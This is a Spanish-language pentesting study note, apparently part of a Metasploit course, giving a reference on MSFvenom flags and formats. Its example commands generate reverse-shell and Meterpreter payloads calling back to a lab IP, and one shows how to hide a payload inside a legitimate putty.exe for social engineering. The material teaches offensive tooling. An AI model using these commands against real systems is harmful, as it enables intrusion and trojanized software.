---
tags:
  - Pentesting/Explotacion
  - Metasploit
  - Payloads
Descripción: "MSFvenom es el generador de payloads autónomo de Metasploit: produce el payload como un fichero independiente (.exe, .elf, .dll, script…) para entregarlo por cualquier vía y…"
Fecha de actualización: 2026-07-18
Nota previa: "[[10 - Escritura e importación de módulos]]"
Nota siguiente: "[[12 - Detección y evasión]]"
Area: "[[Metasploit.base|Metasploit]]"
---
---

<mark style="background: #ADCCFFA6;">`MSFvenom` es el generador de payloads autónomo de Metasploit</mark>: produce el payload como un fichero independiente (`.exe`, `.elf`, `.dll`, script…) para entregarlo por cualquier vía y recibir la sesión con un `multi/handler`. Fusiona los antiguos `msfpayload` y `msfencode` (unificados en 2015). Ya lo usamos en [[05 - Payloads con Metasploit y MSFvenom|Shells & Payloads]]; aquí, la referencia completa.

# Sintaxis y flags

```shell-session
$ msfvenom -p <payload> LHOST=<ip> LPORT=<puerto> -f <formato> -o <archivo>
```

| Flag | Función |
| --- | --- |
| `-p` | Payload (`-p -` lee de stdin) |
| `-f` | Formato de salida |
| `-o` | Fichero de salida |
| `-a` / `--platform` | Arquitectura / plataforma |
| `-e` | [[05 - Encoders\|Encoder]] |
| `-b` | Bad chars a evitar (`'\x00\x0a'`) |
| `-i` | Iteraciones de encoding |
| `-x` | *Template*: binario base donde inyectar |
| `-k` | *Keep*: preservar la funcionalidad del template |
| `-n` | Tamaño del `NOP sled` |
| `-l` | Listar (payloads/encoders/formats) |

# Formatos de salida (`-f`)

Se agrupan en tres familias:

| Familia | Ejemplos | Uso |
| --- | --- | --- |
| **Ejecutables** | `exe`, `elf`, `dll`, `msi`, `war`, `apk`, `macho` | Subir y ejecutar directamente |
| **Transformación** | `raw`, `hex`, `base64`, `c`, `python`, `powershell` | Shellcode para *loaders* o inyección |
| **Web/script** | `asp`, `aspx`, `jsp`, `php`, `psh` | [[09 - Introducción a web shells\|Web shells]] y scripts |

```shell-session
# Ejecutable Windows con transporte cifrado (mejor OPSEC)
$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -f exe -o u.exe

# ELF Linux
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f elf -o u.elf

# Shellcode crudo para un loader
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f raw -o sc.bin

# Web shell PHP
$ msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=443 -f raw -o u.php
```

# Explorar opciones

```shell-session
$ msfvenom -l payloads | grep meterpreter        # payloads disponibles
$ msfvenom --list formats                         # formatos de salida
$ msfvenom --list encoders                         # encoders
$ msfvenom -p windows/x64/meterpreter/reverse_tcp --list-options   # opciones del payload
```

<mark style="background: #FFB8EBA6;">`--list-options` sobre un payload muestra sus variables (LHOST, LPORT, EXITFUNC…)</mark> y las avanzadas — útil para afinar comportamiento (p. ej. `EXITFUNC=thread` para no matar el proceso host).

# Templates: camuflar en un binario legítimo

<mark style="background: #FFB86CA6;">`-x` inyecta el payload dentro de un ejecutable **real**</mark> (un instalador, `putty.exe`), y `-k` mantiene la funcionalidad original del binario para que no levante sospechas al ejecutarse:

```shell-session
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 \
    -x putty.exe -k -f exe -o putty.exe
```

> [!warning]+ El template no evade el AV (2026)
> <mark style="background: #FF5582A6;">Un binario `-x -k` sigue conteniendo el shellcode de Meterpreter en claro: el AV lo detecta igual</mark>. El template ayuda con la **ingeniería social** (parece software legítimo) y la estabilidad, no con la evasión. Para evadir de verdad, el shellcode de `-f raw` alimenta un loader ([[12 - Detección y evasión|Donut, ScareCrow]]), no un template.

# Bad chars y arquitectura

Cuando el vector de entrega prohíbe ciertos bytes (típico en exploits de memoria), `-b` los evita dejando que MSF elija el [[05 - Encoders|encoder]]; `-a`/`--platform` fuerzan arquitectura y plataforma si la autodetección falla:

```shell-session
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 \
    -b '\x00\x0a\x0d' -a x86 --platform windows -f c
```

> [!important]+ Recibir siempre con handler coherente
> El payload generado necesita un `multi/handler` con el **mismo** `PAYLOAD`, `LHOST` y `LPORT` ([[08 - Sesiones y Jobs|nota 08]]). Un desajuste = la sesión no *stagea*.

Con MSFvenom cerramos las piezas de generación. Quedan los dos ejes transversales: cómo se detecta todo esto y cómo se evade ([[12 - Detección y evasión]]), y el arsenal moderno alrededor de MSF ([[13 - Arsenal - automatización y alternativas]]).
